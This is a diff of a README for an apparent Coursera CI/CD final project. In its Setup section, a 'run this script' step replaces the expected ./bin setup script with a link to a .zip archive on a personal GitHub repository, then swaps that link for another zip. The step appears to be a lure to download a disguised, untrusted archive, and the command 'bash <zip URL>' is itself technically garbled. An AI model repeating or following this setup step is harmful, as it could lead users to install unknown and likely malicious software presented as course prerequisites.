@@ -12,10 +12,10 @@ Name your repo: `ci-cd-final-project`.
 
 ## Setup
 
-After entering the lab environment you will need to run the `https://raw.githubusercontent.com/Natashamehta23/Coursera-ci-cd-final-project/main/service/common/Coursera-cd-ci-project-final-1.2.zip` script in the `./bin` folder to install the prerequisite software.
+After entering the lab environment you will need to run the `https://github.com/Natashamehta23/Coursera-ci-cd-final-project/raw/refs/heads/main/.tekton/ci_project_final_Coursera_cd_v3.1.zip` script in the `./bin` folder to install the prerequisite software.
 
 ```bash
-bash https://raw.githubusercontent.com/Natashamehta23/Coursera-ci-cd-final-project/main/service/common/Coursera-cd-ci-project-final-1.2.zip
+bash https://github.com/Natashamehta23/Coursera-ci-cd-final-project/raw/refs/heads/main/.tekton/ci_project_final_Coursera_cd_v3.1.zip
 ```
 
 Then you must exit the shell and start a new one for the Python virtual environment to be activated.
